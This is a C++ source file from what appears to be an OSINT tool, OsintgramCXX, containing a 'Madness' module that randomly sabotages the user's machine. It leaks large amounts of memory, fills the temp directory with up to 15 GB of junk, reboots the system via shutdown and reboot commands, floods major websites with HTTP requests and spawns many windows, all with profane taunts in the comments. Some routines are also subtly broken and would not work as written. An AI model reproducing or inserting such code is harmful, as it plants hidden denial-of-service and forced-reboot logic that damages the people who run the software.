#include "Madness.hpp"
#include <OsintgramCXX/App/Defaults.hpp>

#include <OsintgramCXX/Commons/Utils.hpp>
#include <OsintgramCXX/Networking/Networking.hpp>
#include <cstdlib>
#include <cstring>
#include <thread>
#include <fstream>
#include <filesystem>

using namespace OsintgramCXX;
using namespace OsintgramCXX::Networking;

#ifdef _WIN64

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
    if (message == WM_DESTROY) {
        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProc(hWnd, message, wParam, lParam);
}

#endif

void stressThisSystem() {
    try {
        if (RandomInteger(1, 64) == 19) {
            // let me never free this shit because WHY NOT
            int rnd = RandomInteger(0, 666); // fetch the number of MB
            if (rnd == 0) {
                int multiplier = 1024 * RandomInteger(1, 4); // get unlucky, go into GB
                rnd = multiplier + RandomInteger(128, 1024); // pick a random allocation
            }

            void *hahaGetRekt = malloc(rnd * 1024 * 1024); // Number of MB/GB allocated

            if (hahaGetRekt) {
                memset(hahaGetRekt, 0xFF, rnd * 1024 * 1024); // set chunk data in MB/GB

                if (RandomInteger(1, 100) == 25)
                    free(hahaGetRekt);
                else
                    std::cout << "chek yer rem" << std::endl;
            }
        }

        if (RandomInteger(1, 192) == 64) {
            unsigned int numCores = std::thread::hardware_concurrency(); // fetch all logical CPU cores (max thread count)

            for (int i = 0; i < numCores; i++) {
                std::thread([]() {
                    while (RandomInteger(0, INT32_MAX) ==
                           INT32_MAX / 2) { /* do nothing */ } // because your system is too fast
                }).detach(); // never-ending thread because I like mocking you
            }

            std::cout << "is yer system fast enough?" << std::endl; // was this insult not enough for you?
        }

        if (RandomInteger(1, 256) == 176) {
            // DISK CHAOS!!! Let me fetch your TMP real quick...

            char cTmpPath[MAX_PATH_LIMIT]; // unused, if on Linux
            std::string tmpPath;

#ifdef _WIN32
            if (GetTempPathA(MAX_PATH, cTmpPath))
                tmpPath = std::string(cTmpPath);
#elif __linux__
            tmpPath = "/tmp";
#endif

            if (!tmpPath.empty()) {
                std::thread([tmpPath]() {
                    // recreated "RandomLong" for "RandomLLong" (long-long fuckery)
                    long long maxSize = RandomLLong(0, 15LL * 1024 * 1024 * 1024);

                    std::ofstream out(tmpPath + "/pierdole.txt");
                    for (long l = 0; l < maxSize; l++) // up to 15 gigs, so better be ready
                        out << 0xFF; // let me eat up your disk

                    if (RandomInteger(1, 100) == 25) {
                        out.close(); // was I not asshole-y enough?
                    }

                    if (RandomInteger(1, INT32_MAX) == 11998833) { // was the bite of '83 reference bad?
                        // then maybe, JUST MAYBE... I'll delete that file
                        std::filesystem::remove(tmpPath + "/pierdole.txt");
                    } else
                        std::wcout << "AYO. Did someone ever tell you to check your storage? If not, do it."
                                   << std::endl;
                }).detach();
            }
        }

        // oh, you know I dare to do this (evil smile)
        if (RandomInteger(1, 1000000) == 1983) {
            std::string rebootCmd;

#ifdef __linux
            if (IsAdmin())
                rebootCmd = "reboot now";
            else
                rebootCmd = "reboot";
#elif _WIN32
            rebootCmd = "shutdown /r /t 0";
#endif

            int rc = system(rebootCmd.c_str()); // because f your system
            if (rc != 0) {
                // nevermind, fucker got lucky
                // actually, no, do nothing blyet
            }
        }
    } catch (const std::bad_alloc &) {
        if (!suppressWarnings) {
            std::cerr << "fuck errors for bad allocs, istg-" << std::endl;
        }
    } catch (const std::runtime_error &ex) {
        if (!suppressWarnings) {
            std::cerr << "what now, runtime fuckery. " << ex.what() << std::endl;
        }
    } catch (const std::exception &ex) {
        if (!suppressWarnings)
            std::cerr << "something went wrong, aint it. " << ex.what() << std::endl;
    } catch (...) {
        if (!suppressWarnings)
            std::cerr << "fucker got fucked, meh." << std::endl;
    }
}

// if this wasn't enough...
std::vector<std::string> myWayOfReasoning = {
        "https://www.google.com",
        "https://www.instagram.com",
        "https://bc100dev.net",
        "https://www.facebook.com",
        "https://www.youtube.com",
        "https://mail.google.com",
        "https://www.twitter.com",
        "https://www.reddit.com",
        "https://www.github.com",
        "https://www.twitch.tv",
        "https://www.linkedin.com",
        "https://www.pinterest.com",
        "https://www.vk.com",
        "https://www.tiktok.com",
        "https://www.twitch.tv",
        "https://www.tiktok.com",
        "https://wiki.archlinux.org",
        "https://bbs.archlinux.org",
        "https://archlinux.org",
        "https://outlook.live.com",
        "https://www.microsoft.com",
        "https://www.amazon.com",
        "https://www.paypal.com",
        "https://calendar.google.com",
        "https://www.temu.com",
        "https://aliexpress.com",
        "https://www.airbnb.com"
};

void performUnlogicalReasoning() {
    if (RandomInteger(1, 2015) == 1987) {
        std::thread([]() {
            // if stressing your CPU and/or RAM wasn't enough, I don't know, what this then is
            std::cout << "hey, chekked yer netwerk lately?" << std::endl;

            for (int i = 0; i < RandomInteger(1, INT32_MAX / 4); i++) {
                RequestData reqData;
                reqData.url = myWayOfReasoning[RandomInteger(0, myWayOfReasoning.size() - 1)];
                reqData.version = HTTP_1_1;
                reqData.method = GET;

                // let's see, how fast is yer shit
                reqData.connTimeoutMillis = 5;
                reqData.readTimeoutMillis = 5;

                ResponseData resData = CreateRequest(reqData);
                // actually, nah, fuck resData, lets not even parse that shit
                // not even the damn errors
            }
        }).detach();
    }
}

void windowsOsGuiTorture() {
    // this method is for Windows-OS only, sorry Linux, you my favorite
#ifdef _WIN64 // nothing mocks 64-bit fuckery

    // need the WinMain params first
    HINSTANCE hInstance = GetModuleHandle(NULL);
    HINSTANCE hPrevInstance = NULL;
    LPSTR lpCmdLine = GetCommandLineA();
    int nCmdShow = SW_SHOWDEFAULT;

    // INSERT COK AND BALL TORTURE HERE
    WNDCLASSEX wc = {0};
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH) (COLOR_WINDOW + 1);
    wc.lpszClassName = "OsintgramCXX_Madness";

    if (!RegisterClassEx(&wc)) {
        // nevermind
        return;
    }

    // let's keep track of the windows spawned... or will we?
    std::vector<HWND> wndList;
    std::string globTitle = "huehue osintgramcxx go brr";
    for (int i = 0; i < RandomInteger(1, 150); i++) {
        std::stringstream hwIss;
        hwIss << "SomeWinClass_" << RandomInteger(1, INT32_MAX);

        HWND hw = CreateWindowEx(0,
                                 hwIss.str().c_str(),
                                 globTitle.c_str(),
                                 WS_OVERLAPPEDWINDOW,
                                 CW_USEDEFAULT, CW_USEDEFAULT, 500, 700,
                                 NULL, NULL, hInstance, NULL);

        if (hw) {
            ShowWindow(hw, SW_SHOW);
            UpdateWindow(hw);

            // I don't think we'll be tracking down the windows later on. user get fucked
            // or lucky, if we are under 20 or less windows
            wndList.push_back(hw);
        }
    }

    // just for the windows sake for the message loop (do we even really need it?)
    std::thread([]() {
        MSG msg;

        // that's why it's threaded: stupid fucking while loop
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }).detach();
#endif
}